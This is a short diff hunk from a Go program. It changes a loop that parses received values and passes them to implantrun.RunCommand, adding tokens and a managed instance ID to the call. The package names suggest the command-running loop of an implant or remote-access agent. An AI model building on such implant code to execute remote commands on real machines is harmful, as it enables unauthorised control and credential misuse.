@@ -38,7 +38,7 @@ func main() {
 				str := fmt.Sprintf("%v", c)
 				str = strings.TrimSuffix(str, "]")
 				str = implantutil.TrimFirstRune(str)
-				implantrun.RunCommand(str, cmdid)
+				implantrun.RunCommand(str, cmdid, tokens, managedInstanceID)
 			}
 		}
 	}
